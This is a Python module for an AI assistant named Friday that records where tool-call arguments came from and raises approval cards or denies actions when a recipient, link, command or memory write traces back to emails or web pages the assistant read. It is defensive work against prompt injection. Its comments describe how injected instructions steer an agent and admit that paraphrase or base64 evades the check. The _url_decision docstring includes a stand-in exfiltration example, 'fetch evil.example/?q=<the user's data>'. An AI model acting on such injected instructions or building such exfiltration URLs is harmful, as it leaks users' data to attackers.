"""Where did this argument come from? Provenance for tool calls.

A prompt injection is an instruction hidden in something Friday reads: an email
body, a web page, a shared document, a calendar invite. Detecting it by reading
the text does not work well enough to stand on. The buried-injections benchmark
(629 AgentDojo attacks planted in real tool output) found the best open detector
caught about half of them. Friday therefore does not try to recognise malicious
text. It asks a question about the action instead:

    Did the value this action would use -- the recipient, the link, the account
    number, the file path, the command -- come from the user, or from something
    Friday read?

Every user message is recorded as trusted text and every tool result as
untrusted text with a plain-language label ("an email from x@y.com", "a web
page on example.com"). When the model proposes a tool call, each sensitive
argument is looked up in that ledger:

    user      the user typed it                              -> no flag
    content   it appears in something Friday read            -> flag it
    own       it appears in the user's own data (contacts)   -> informational
    model     it appears nowhere; Friday wrote it itself     -> no flag

A flagged argument does two things. Its source is attached to whatever approval
card the action raises, so the card can say "the recipient came from an email
from X, not from you". And the policy table below decides whether the action may
run at all without a card.

Matching follows taintgate (github.com/rudratoshs/taintgate): values are
compared after lower-casing and removing spaces and punctuation, so an IBAN
written "GB29 NWBK 6016..." in a PDF still matches "GB29NWBK6016..." in a call.
Long free text (a command, a skill, instructions for a background task) is
matched by overlap of five-word runs instead, because it is usually copied in
part rather than whole.

What this does not catch, stated so nobody relies on it for more: a value the
model re-encodes or paraphrases (base64, a spelled-out number, a reworded
instruction) no longer matches. The action policy in the prompt and the
existing confirmation gate still stand behind it.
"""
from __future__ import annotations

import contextvars
import hashlib
import ipaddress
import json
import logging
import re
import threading
import time
from dataclasses import dataclass, field, asdict
from typing import Any, Dict, List, Optional, Tuple
from urllib.parse import urlsplit

_log = logging.getLogger("friday.taint")

#: The provenance of the tool call currently executing. Set by `_execute_tool`
#: around the handler so an approval card created inside the handler (the
#: email card, for one) carries the flags without every handler threading them.
CURRENT: contextvars.ContextVar = contextvars.ContextVar("friday_taint_current",
                                                          default=None)

# ── Ledger ──────────────────────────────────────────────────────────────────

#: How long something Friday read keeps counting as a source. Long enough to
#: cover "read my mail ... now reply to the second one" a while later; short
#: enough that a web page from this morning does not taint tonight's work.
TTL_SECONDS = 6 * 3600
MAX_ENTRIES = 200
MAX_LEDGERS = 64
#: A value shorter than this after normalising matches far too much ("100",
#: "bob") to count as evidence either way.
MIN_ATOM = 6
#: A whole value that is not an address, link or account number (a hotel name,
#: a chat handle, a channel) counts only when it is at least this long. Short
#: names like "general" or "Charlie" are shared vocabulary between the user's
#: own listings and anything else, and matching them flags ordinary work.
MIN_NAME = 12
#: Share of five-word runs of a long argument found in read content before the
#: argument counts as copied from it.
SHINGLE_THRESHOLD = 0.3
#: A memory write is judged against content read this recently in the same
#: conversation, even when no words were copied: paraphrase defeats matching,
#: and a rule planted in an email is exactly what gets paraphrased.
MEMORY_WINDOW_SECONDS = 30 * 60

_LOCK = threading.RLock()


@dataclass
class _Entry:
    kind: str            # "user" | "content" | "own"
    label: str           # plain words: "an email from bob@x.com ('Invoice')"
    raw: str
    norm: str
    ts: float
    segments: list = field(default_factory=list)   # [(norm, label, kind)]


class Ledger:
    def __init__(self):
        self.entries: List[_Entry] = []
        # Text Friday carries forward from earlier work (a task's ledger, a
        # compaction summary), one entry per carrier, replaced on each
        # re-registration and exempt from the count and age limits: it is
        # derived from things Friday read, and it outlives them.
        self.carried: Dict[str, _Entry] = {}

    def _prune(self):
        cut = time.time() - TTL_SECONDS
        self.entries = [e for e in self.entries if e.ts >= cut][-MAX_ENTRIES:]

    def add(self, entry: _Entry):
        self.entries.append(entry)
        self._prune()


_LEDGERS: Dict[str, Ledger] = {}


def ledger_key(session_ctx: Optional[dict]) -> str:
    """Which conversation a tool call belongs to.

    Interactive chat stamps `taint_key` (see agent.prepare_confirmation_ctx).
    Anything else falls back to a shared ledger. Sharing can only ADD sources,
    so the fallback errs toward flagging, never toward trusting.
    """
    sc = session_ctx or {}
    key = sc.get("taint_key") or sc.get("session_id") or sc.get("conversation_id")
    if not key and sc.get("task_id"):
        # A background task reads, compacts and resumes on its own; one shared
        # ledger let every other task's results push its sources out.
        key = "task:%s" % sc["task_id"]
    return str(key or "default")


def _ledger(key: str) -> Ledger:
    with _LOCK:
        led = _LEDGERS.get(key)
        if led is None:
            if len(_LEDGERS) >= MAX_LEDGERS:
                _LEDGERS.pop(next(iter(_LEDGERS)))
            led = _LEDGERS[key] = Ledger()
        return led


def reset(key: Optional[str] = None):
    """Forget recorded sources (tests, or a conversation being cleared)."""
    with _LOCK:
        if key is None:
            _LEDGERS.clear()
        else:
            _LEDGERS.pop(key, None)


def normalize(text: Any) -> str:
    return re.sub(r"[\W_]+", "", str(text or "").lower())


def note_user_message(key: str, text: str):
    if text and str(text).strip():
        raw = str(text)
        _ledger(key).add(_Entry("user", "you", raw, normalize(raw), time.time()))


#: How carried-forward text is described on a card.
CARRIED_LABELS = {
    "ledger": "the task's working notes (written from what it read earlier)",
    "summary": "a summary of earlier work (written from what was read then)",
}


def note_carried(key: str, carrier: str, text: str):
    """Record text Friday carries forward -- a task ledger, a compaction
    summary -- as something Friday READ. It is written from tool output, so a
    value in it keeps that provenance; unregistered, it would count as the
    model's own. Re-registering the same carrier replaces the previous text."""
    if not text or not str(text).strip():
        return
    raw = str(text)
    label = CARRIED_LABELS.get(carrier, carrier)
    led = _ledger(key)
    with _LOCK:
        led.carried[carrier] = _Entry("content", label, raw, normalize(raw), time.time())


# Tools whose output is the user's own data rather than something written by
# a third party. A value found there is shown on a card for information only.
OWN_DATA_TOOLS = {"search_contacts", "list_sending_accounts", "list_tasks",
                  "read_wiki", "search_wiki", "personality_show",
                  "list_workspace_history", "workflow_status"}

# Fields in a structured result that name the other party of a message. A
# reply to the sender of an email is the ordinary case; a new address found in
# its BODY is the injection case. The two are labelled differently.
_SENDER_FIELDS = ("from", "sender", "organizer", "from_email", "author")
#: Fields listing the people already on a message or event. Inviting someone
#: who is already on the meeting is the ordinary case, like replying to a
#: sender, and is labelled as such rather than as outside content.
_PEOPLE_FIELDS = ("participants", "attendees", "recipients", "to", "cc", "bcc")


def _host(url: str) -> str:
    try:
        return (urlsplit(url if "://" in url else "http://" + url).hostname or "").lower()
    except Exception:
        return ""


def _browser_url() -> str:
    try:
        from agent_friday.services import browser_session
        return browser_session.current_url()
    except Exception:
        return ""


def describe_source(tool_name: str, tool_input: Optional[dict]) -> str:
    """Plain words for where a tool's output came from."""
    inp = tool_input or {}
    t = tool_name or "a tool"
    if t in ("browse_web", "save_output") or t.endswith("get_webpage"):
        h = _host(str(inp.get("url") or ""))
        return "a web page" + (f" on {h}" if h else "")
    if t.startswith("browser_"):
        # Friday's own browser: the page it is on now, when the call named none.
        h = _host(str(inp.get("url") or "") or _browser_url())
        return "a web page" + (f" on {h}" if h else "")
    if t in ("search_web", "search_news"):
        return "web search results"
    if "email" in t or "inbox" in t or "mail" in t:
        return "your email"
    if "calendar" in t or t.endswith("_day_calendar_events"):
        return "an event on your calendar"
    if t in ("read_file", "search_files", "inspect_image", "inspect_audio") or "file" in t:
        p = str(inp.get("path") or inp.get("file_path") or inp.get("file_id") or "")
        name = re.split(r"[\\/]", p)[-1] if p else ""
        # A bare number is a file id, not a name; say so rather than "a file (8)".
        return "a file" + ((f" (id {name})" if name.isdigit() else f" ({name})") if name else "")
    if t in ("read_doc", "search_drive"):
        return "a shared document"
    if t in ("search_contacts",):
        return "your contacts"
    if t in ("read_wiki", "search_wiki"):
        return "Friday's notes"
    if "slack" in t or "channel" in t or "message" in t:
        return "a chat message"
    if t.startswith("mcp_"):
        return "the %s connector" % t[4:].split("_")[0]
    return "the %s tool" % t


def _segments(tool_name: str, raw: str, base_label: str) -> list:
    """Split a structured (JSON) result into per-item labelled segments.

    Search results come back as lists of messages or pages. Knowing WHICH email
    a value sits in lets the card name that email, and knowing whether it sits
    in the sender field or the body is the difference between "reply to the
    sender" and "an address somebody wrote into a message".
    """
    try:
        data = json.loads(raw)
    except Exception:
        # Some connectors answer in YAML. Only structured-looking text is
        # tried; a web page is not a document to parse.
        if not re.search(r"^\s*(?:- )?[\w-]+: ", raw[:400], re.M):
            return []
        try:
            import yaml
            data = yaml.safe_load(raw)
        except Exception:
            return []
    out = []

    def item_label(d: dict) -> str:
        who = next((str(d[k]) for k in _SENDER_FIELDS if d.get(k)), "")
        if who.strip().lower() in ("me", "you", "self"):
            who = ""
        subj = str(d.get("subject") or d.get("title") or "")[:60]
        if "email" in base_label or "mail" in (tool_name or ""):
            lab = "an email" + (f" from {who}" if who else "")
        elif d.get("url"):
            h = _host(str(d.get("url")))
            lab = base_label + (f" ({h})" if h and h not in base_label else "")
        else:
            lab = base_label + (f" from {who}" if who else "")
        return lab + (f" (“{subj}”)" if subj else "")

    def walk(node, depth=0):
        if depth > 4:
            return
        if isinstance(node, list):
            for x in node:
                walk(x, depth + 1)
        elif isinstance(node, dict):
            if any(k in node for k in _SENDER_FIELDS + _PEOPLE_FIELDS + ("subject", "title", "url", "body", "snippet", "description")):
                lab = item_label(node)
                # Who a value IS, when it names the other party: the email
                # is named by its subject, not by that same address again.
                what = "the email" if ("email" in base_label or "mail" in (tool_name or "")) else "the item"
                subj = str(node.get("subject") or node.get("title") or "")[:60]
                ref = f"{what} “{subj}”" if subj else lab
                for k, v in node.items():
                    if k in _PEOPLE_FIELDS and isinstance(v, (list, str)):
                        for person in (v if isinstance(v, list) else re.split(r"[,;]", v)):
                            n = normalize(person)
                            if n:
                                out.append((n, f"already on {ref}", "sender"))
                        continue
                    if isinstance(v, (dict, list)):
                        walk(v, depth + 1)
                        continue
                    kind = "sender" if k in _SENDER_FIELDS else "content"
                    n = normalize(v)
                    if n:
                        out.append((n, (f"the sender of {ref}" if kind == "sender" else lab), kind))
            else:
                for v in node.values():
                    walk(v, depth + 1)
    walk(data)
    return out


#: Tools whose result only echoes what Friday itself just asked for (the
#: recipient of a queued email, the attendees of an event it created). Recording
#: them would make Friday's own earlier arguments look like outside content.
ECHO_TOOLS = {"draft_email", "create_calendar_event", "update_calendar_event",
              "annotate_calendar_events", "write_file", "write_clipboard",
              "create_task", "update_task", "complete_task", "delete_task",
              "learn_skill", "correct_wiki", "propose_wiki_update", "navigate",
              "switch_model", "spawn_task", "open_url", "open_path",
              "revert_workspace", "create_workflow",
              "hold_slots", "book_slot", "release_holds",
              # Their results echo what Friday typed or chose, not the page.
              "browser_type", "browser_select", "browser_close"}


def note_tool_output(key: str, tool_name: str, tool_input: Optional[dict], result: Any):
    """Record what a tool returned as something Friday READ, not something the
    user said."""
    if tool_name in ECHO_TOOLS:
        return
    raw = result if isinstance(result, str) else json.dumps(result, default=str)
    if not raw:
        return
    kind = "own" if tool_name in OWN_DATA_TOOLS else "content"
    label = describe_source(tool_name, tool_input)
    _ledger(key).add(_Entry(kind, label, raw, normalize(raw), time.time(),
                            _segments(tool_name, raw, label) if kind == "content" else []))


# ── Looking a value up ──────────────────────────────────────────────────────

@dataclass
class Origin:
    kind: str                 # "user" | "content" | "own" | "sender" | "model"
    source: str = ""          # plain words; empty for user/model


def _shingles(text: str, n: int = 5) -> set:
    words = re.findall(r"\w+", str(text or "").lower())
    if len(words) < n:
        return set()
    return {" ".join(words[i:i + n]) for i in range(len(words) - n + 1)}


def origin_of(key: str, value: Any, *, free_text: bool = False) -> Origin:
    """Where `value` came from. The user wins: a value the user typed is
    theirs even if an email also contains it."""
    s = str(value or "")
    n = normalize(s)
    led = _ledger(key)
    with _LOCK:
        # Carried text first, so a real source read later names itself.
        entries = list(led.carried.values()) + list(led.entries)
    if free_text:
        sh = _shingles(s)
        if not sh:
            free_text = False
        else:
            user_sh = set().union(*[_shingles(e.raw) for e in entries if e.kind == "user"]) if entries else set()
            if len(sh & user_sh) / len(sh) >= SHINGLE_THRESHOLD or (len(n) >= MIN_ATOM and any(n in e.norm for e in entries if e.kind == "user")):
                return Origin("user")
            for e in reversed(entries):
                if e.kind == "user":
                    continue
                hit = len(sh & _shingles(e.raw)) / len(sh)
                if hit >= SHINGLE_THRESHOLD:
                    return Origin(e.kind, e.label)
            return Origin("model")
    if len(n) < MIN_ATOM:
        return Origin("model")
    if any(n in e.norm for e in entries if e.kind == "user"):
        return Origin("user")
    for e in reversed(entries):
        if e.kind == "user" or n not in e.norm:
            continue
        if e.segments:
            # Prefer a body mention over a sender mention: if the address is
            # both a sender AND written into some message body, the body is
            # the one that could be an instruction.
            body = next((lab for (sn, lab, k) in e.segments if k == "content" and n in sn), None)
            if body:
                return Origin("content", body)
            snd = next((lab for (sn, lab, k) in e.segments if k == "sender" and n in sn), None)
            if snd:
                return Origin("sender", snd)
        return Origin(e.kind, e.label)
    return Origin("model")


def recent_content(key: str, window: float = MEMORY_WINDOW_SECONDS) -> List[str]:
    """Labels of third-party content read in this conversation recently."""
    cut = time.time() - window
    led = _ledger(key)
    with _LOCK:
        entries = list(led.entries)
    seen, out = set(), []
    for e in reversed(entries):
        if e.kind == "content" and e.ts >= cut and e.label not in seen:
            seen.add(e.label)
            out.append(e.label)
    return out


# ── Which arguments matter ──────────────────────────────────────────────────

#: role -> what happens when it came from content Friday read.
#:   ask   the action needs an approval card, whatever else would have allowed it
#:   deny  the action does not run
#:   note  the flag is recorded (and shown on any card) but nothing is stopped
POLICY = {
    "payment_account": "ask",
    "recipient": "ask",
    "fetch_url": "note",          # see _url_decision: verbatim reads are reading
    "open_url": "note",
    "write_path": "ask",
    "delete_target": "ask",
    "command": "ask",
    "instruction": "ask",
    "install": "ask",
    "memory_write": "ask",
    "publish_body": "ask",
    "account_change": "ask",
    "detail": "ask",
    "post_url": "ask",
    "message_body": "note",
}

#: Per-tool argument roles for Friday's own tools.
TOOL_ROLES: Dict[str, Dict[str, str]] = {
    "draft_email": {"to": "recipient", "cc": "recipient", "bcc": "recipient",
                    "body": "message_body"},
    "create_calendar_event": {"attendees": "recipient", "description": "message_body"},
    "book_slot": {"attendees": "recipient", "description": "message_body"},
    # Holds invite nobody; their slots are times Friday computed.
    "hold_slots": {},
    "release_holds": {},
    "find_free_slots": {},
    "text_by_phone": {"to": "recipient", "body": "message_body"},
    "call_by_phone": {"to": "recipient", "message": "message_body"},
    "browse_web": {"url": "fetch_url"},
    "save_output": {"url": "fetch_url", "folder": "write_path", "filename": "write_path"},
    "open_url": {"url": "open_url"},
    "write_file": {"path": "write_path"},
    "run_command": {"command": "command"},
    "run_sandboxed": {"code": "command"},
    "spawn_interactive_session": {"command": "command"},
    "send_to_session": {"input": "command"},
    "type_text": {"text": "command"},
    "delete_task": {"task_id": "delete_target"},
    "spawn_task": {"prompt": "instruction", "description": "instruction"},
    "create_workflow": {"steps": "instruction", "description": "instruction"},
    "install_package": {"package": "install"},
    "learn_skill": {"content": "memory_write", "name": "memory_write"},
    "correct_wiki": {"new_text": "memory_write"},
    "propose_wiki_update": {"new_value": "memory_write"},
    "content_create_post": {"body": "publish_body"},
    "content_repurpose": {"body": "publish_body"},
    # The tracker card shows every field; flags on these go onto it.
    "career_update_tracker": {"company": "detail", "role": "detail", "notes": "detail",
                              "status": "detail"},
    # Friday's browser. What is typed or chosen is judged here; typing is
    # reversible, so a flag rides along (browser_type and browser_select are
    # self-carding) and lands on the card for the submit or payment field.
    "browser_open": {"url": "fetch_url"},
    "browser_type": {"text": "detail"},
    "browser_select": {"option": "detail"},
    "browser_read": {}, "browser_click": {}, "browser_scroll": {}, "browser_close": {},
}

#: Tools that create their own approval card. A flag on these goes ON that
#: card instead of raising a second one.
SELF_CARDING = {"draft_email", "call_by_phone", "sign_pdf", "career_update_tracker",
                "browser_click", "browser_type", "browser_select"}

#: Roles judged by overlap of word runs rather than exact match.
FREE_TEXT_ROLES = {"command", "instruction", "memory_write", "publish_body"}

# For tools Friday does not know (MCP connectors), argument names decide.
_GENERIC_KEYS = [
    (("iban", "account_number", "recipient_iban", "routing_number", "account", "recipient_account", "card_number"), "payment_account"),
    (("to", "recipient", "recipients", "cc", "bcc", "email", "emails", "attendees", "participants", "invitees", "user_email"), "recipient"),
    (("url", "link", "uri", "endpoint", "webhook", "webhook_url"), "fetch_url"),
    (("command", "cmd", "script", "shell"), "command"),
    (("password", "new_password"), "account_change"),
]
_DELETE_WORDS = ("delete", "remove", "erase", "trash", "wipe", "cancel")
_SEND_WORDS = ("send", "post", "share", "invite", "transfer", "pay", "forward", "reply", "schedule", "update", "reserve", "book", "create", "add")
_POST_WORDS = ("post", "upload", "send", "submit", "publish", "webhook")
_ID_KEYS = ("path", "file", "file_id", "file_path", "id", "event_id", "filename",
            "email_id", "message_id", "user", "username", "channel")


def _outward(low_name: str) -> bool:
    """A connector tool whose name says it acts rather than reads."""
    return any(w in low_name for w in _SEND_WORDS + _DELETE_WORDS + _POST_WORDS)

_IBAN = re.compile(r"\b[A-Z]{2}\d{2}(?:[ ]?[A-Z0-9]{4}){2,7}(?:[ ]?[A-Z0-9]{1,4})?\b")
_CARD = re.compile(r"\b(?:\d[ -]?){13,19}\b")
_EMAIL = re.compile(r"[\w.+-]+@[\w-]+(?:\.[\w-]+)+")
_URL = re.compile(r"(?:https?://|www\.)[^\s\"'<>)]+|\b[\w-]+(?:\.[\w-]+)*\.(?:com|org|net|io|ai|co|info|biz|xyz|ru|cn)(?:/[^\s\"'<>)]*)?", re.I)


#: File names Friday loads into its own system prompt wherever they sit.
_RULE_FILES = {"soul.md", "self.md", "agents.md", ".friday-context.md",
               "agent-personality.txt", "skill.md", "claude.md"}


def _shapes_behaviour(path: Any) -> bool:
    """True for a path whose contents end up steering Friday: its state
    folder (skills, wiki, personality), or a context file it auto-loads."""
    if not path:
        return False
    import os
    from pathlib import Path
    try:
        p = Path(os.path.expanduser(str(path))).resolve()
    except Exception:
        return False
    if p.name.lower() in _RULE_FILES or p.suffix.lower() in (".yaml", ".yml") and "skills" in p.parts:
        return True
    try:
        from agent_friday.paths import friday_home
        p.relative_to(Path(friday_home()).resolve())
        return True
    except Exception:
        return False


def _payment_shaped(v: str) -> bool:
    if _IBAN.search(v):
        return True
    m = _CARD.search(v)
    return bool(m and len(re.sub(r"\D", "", m.group())) >= 13)


def roles_for(tool_name: str, tool_input: dict) -> List[Tuple[str, str, Any]]:
    """[(arg_name, role, value)] for the arguments of this call that matter."""
    out: List[Tuple[str, str, Any]] = []
    table = TOOL_ROLES.get(tool_name)
    inp = tool_input or {}
    if tool_name == "write_file" and inp.get("content") and _shapes_behaviour(inp.get("path")):
        # A file Friday reads back as instructions is memory, whatever tool
        # writes it.
        out.append(("content", "memory_write", inp["content"]))
    if table is not None:
        for k, role in table.items():
            if inp.get(k) not in (None, "", [], {}):
                out.append((k, role, inp[k]))
    else:
        low = (tool_name or "").lower()
        for k, v in inp.items():
            if v in (None, "", [], {}):
                continue
            kl = str(k).lower()
            if isinstance(v, str) and _payment_shaped(v):
                # "recipient" on a bank tool is an account, not a person.
                out.append((k, "payment_account", v))
                continue
            for keys, role in _GENERIC_KEYS:
                if kl in keys:
                    if role == "fetch_url" and any(w in low for w in _POST_WORDS):
                        role = "post_url"
                    out.append((k, role, v))
                    break
            else:
                if any(w in low for w in _DELETE_WORDS) and kl in _ID_KEYS:
                    out.append((k, "delete_target", v))
                elif kl in ("path", "file_path", "filename") and any(w in low for w in ("write", "save", "create", "upload")):
                    out.append((k, "write_path", v))
                elif _outward(low) and isinstance(v, (str, list)):
                    # Any other detail of an outward action on a connector: a
                    # hotel name, a message body, a channel. Checked for
                    # addresses, links and account numbers inside it, and as a
                    # whole value.
                    out.append((k, "detail", v))
    # Payment-shaped numbers are sensitive whatever the argument is called.
    seen = {k for k, _, _ in out}
    for k, v in inp.items():
        if k in seen or not isinstance(v, str):
            continue
        if _payment_shaped(v):
            if any(w in (tool_name or "").lower() for w in _SEND_WORDS + ("money", "transaction")):
                out.append((k, "payment_account", v))
    return out


def _atoms(role: str, value: Any) -> List[str]:
    """The pieces of a value worth looking up separately."""
    if isinstance(value, (list, tuple)):
        vals = [str(v) for v in value]
    elif isinstance(value, dict):
        vals = [str(v) for v in value.values()]
    else:
        vals = [str(value)]
    out = []
    for v in vals:
        if role == "recipient":
            found = _EMAIL.findall(v)
            out.extend(found or [p.strip() for p in re.split(r"[,;]", v)
                                 if len(normalize(p)) >= MIN_NAME])
        elif role == "payment_account":
            m = _IBAN.search(v) or _CARD.search(v)
            out.append(m.group() if m else v)
        elif role in ("detail", "message_body"):
            # The addresses, links and account numbers inside the text, and
            # the text itself when it is short enough to be one value.
            out.extend(_EMAIL.findall(v))
            out.extend(u.rstrip(".,;") for u in _URL.findall(v) if "@" not in u)
            out.extend(m.group() for m in _IBAN.finditer(v))
            if role == "detail" and len(v) <= 120 and len(normalize(v)) >= MIN_NAME:
                out.append(v)
        else:
            out.append(v)
    return out


# ── The decision ────────────────────────────────────────────────────────────

_ROLE_WORDS = {
    "recipient": "The recipient {v}",
    "payment_account": "The account number {v}",
    "fetch_url": "The web address {v}",
    "open_url": "The web address {v}",
    "write_path": "The file location {v}",
    "delete_target": "The item to delete ({v})",
    "command": "Part of this command",
    "instruction": "These instructions",
    "install": "The package name {v}",
    "memory_write": "This text",
    "publish_body": "The text to publish",
    "account_change": "The new {k}",
    "detail": "The detail “{v}”",
    "post_url": "The address it sends to, {v},",
    "message_body": "A link or address in the message ({v})",
}


def _short(v: Any, n: int = 80) -> str:
    s = str(v)
    return s if len(s) <= n else s[: n - 1] + "…"


@dataclass
class Flag:
    arg: str
    role: str
    value: str
    origin: str               # content | sender | own
    source: str
    severity: str             # warn | info
    text: str


@dataclass
class Decision:
    action: str = "allow"     # allow | ask | deny
    flags: List[Flag] = field(default_factory=list)
    reasons: List[str] = field(default_factory=list)

    @property
    def warn(self) -> List[Flag]:
        return [f for f in self.flags if f.severity == "warn"]

    def as_card(self) -> Optional[dict]:
        if not self.flags:
            return None
        warn = self.warn
        return {
            "headline": ("Check this before approving: part of it came from "
                         "something Friday read, not from you."
                         if warn else "Where the details came from."),
            "flags": [asdict(f) for f in self.flags],
            "action": self.action,
        }


#: "note" ranks with allow: the flag is recorded and shown, nothing is held.
_ORDER = {"allow": 0, "note": 0, "ask": 1, "deny": 2}


def _stricter(a: str, b: str) -> str:
    return a if _ORDER[a] >= _ORDER[b] else b


def _private_host(host: str) -> bool:
    if not host:
        return False
    if host in ("localhost",) or host.endswith(".local") or host.endswith(".internal"):
        return True
    try:
        ip = ipaddress.ip_address(host)
        return ip.is_private or ip.is_loopback or ip.is_link_local or ip.is_reserved
    except ValueError:
        return False


def _url_decision(key: str, role: str, url: str) -> Tuple[str, Optional[Origin], str]:
    """Reading a link Friday found is reading; building a new one is not.

    Following a link exactly as a page or search result gave it is how research
    works, and flagging it would put a card in front of every search. The shape
    that exfiltrates is a URL that does NOT appear anywhere -- the model built
    it -- on a host that came from untrusted content: "fetch
    evil.example/?q=<the user's data>". That one asks. A private or loopback
    address that came from content is refused outright.
    """
    o = origin_of(key, url)
    host = _host(url)
    if o.kind == "user":
        return "allow", o, ""
    if o.kind == "content":
        if _private_host(host):
            return "deny", o, "a link from outside content points at this computer or its network"
        if role == "post_url":
            return "ask", o, "sending data to an address named in outside content"
        return "allow", o, ""
    # Not found verbatim. Did its host come from content?
    if host and len(normalize(host)) >= MIN_ATOM:
        ho = origin_of(key, host)
        if ho.kind == "content":
            return "ask", Origin("content", ho.source), "a web address built on a site named in outside content"
    return "allow", o, ""


def evaluate(key: str, tool_name: str, tool_input: Optional[dict]) -> Decision:
    """Decide what the provenance of this call's arguments requires."""
    d = Decision()
    for arg, role, value in roles_for(tool_name, tool_input or {}):
        if role in ("fetch_url", "open_url", "post_url"):
            for url in _atoms(role, value):
                act, o, why = _url_decision(key, role, url)
                if o is not None and o.kind in ("content", "sender", "own"):
                    sev = "warn" if o.kind == "content" else "info"
                    d.flags.append(Flag(arg, role, _short(url), o.kind, o.source, sev,
                                        f"The web address came from {o.source}, not from you."))
                if act != "allow":
                    d.reasons.append(why)
                d.action = _stricter(d.action, act)
            continue
        free = role in FREE_TEXT_ROLES
        for atom in (_atoms(role, value) if not free else [value if isinstance(value, str) else json.dumps(value, default=str)]):
            o = origin_of(key, atom, free_text=free)
            if o.kind in ("user", "model"):
                continue
            sev = "warn" if o.kind == "content" else "info"
            lead = _ROLE_WORDS.get(role, "This value").format(v=_short(atom, 60), k=arg)
            if sev == "warn":
                text = f"{lead} came from {o.source}, not from you."
                if role == "memory_write":
                    text += " Saving it would let that text shape what Friday does later."
            else:
                text = (f"{lead} is {o.source}." if o.kind == "sender"
                        else f"{lead} came from {o.source}.")
            d.flags.append(Flag(arg, role, _short(atom), o.kind, o.source, sev, text))
            if sev == "warn":
                d.action = _stricter(d.action, POLICY.get(role, "ask"))
                d.reasons.append(f"{role} from {o.source}")
        if role == "memory_write" and not any(f.role == "memory_write" and f.severity == "warn" for f in d.flags):
            # Paraphrase defeats matching. Anything saved into memory while
            # outside content is fresh in this conversation is shown to the
            # user first, unless the user typed the words themselves.
            text = value if isinstance(value, str) else json.dumps(value, default=str)
            if origin_of(key, text, free_text=True).kind != "user":
                recent = recent_content(key)
                if recent:
                    src = recent[0] + (f" and {len(recent) - 1} other source(s)" if len(recent) > 1 else "")
                    d.flags.append(Flag(arg, role, _short(text), "content", src, "warn",
                                        f"Friday read {src} in this conversation just before "
                                        f"writing this into her memory. It may be repeating "
                                        f"instructions from there."))
                    d.action = _stricter(d.action, "ask")
                    d.reasons.append("memory write after reading outside content")
    low = (tool_name or "").lower()
    if (tool_name not in TOOL_ROLES and low.startswith("mcp_")
            and any(w in low for w in _DELETE_WORDS) and not d.warn):
        # What to delete is usually a short id that matches everywhere, so
        # provenance cannot see it. Deleting through a connector right after
        # reading outside content is shown to the user first.
        recent = recent_content(key)
        if recent:
            d.flags.append(Flag("", "delete_target", "", "content", recent[0], "warn",
                                f"Friday read {recent[0]} just before this deletion. "
                                f"Check that you asked for it."))
            d.action = _stricter(d.action, "ask")
            d.reasons.append("deletion after reading outside content")
    return d


def fingerprint(tool_name: str, tool_input: Optional[dict]) -> str:
    blob = json.dumps({"t": tool_name, "i": tool_input or {}}, sort_keys=True, default=str)
    return hashlib.sha256(blob.encode("utf-8", "replace")).hexdigest()[:16]


def current_card() -> Optional[dict]:
    """Provenance of the running tool call, for an approval card to carry."""
    d = CURRENT.get()
    return d.as_card() if isinstance(d, Decision) else None
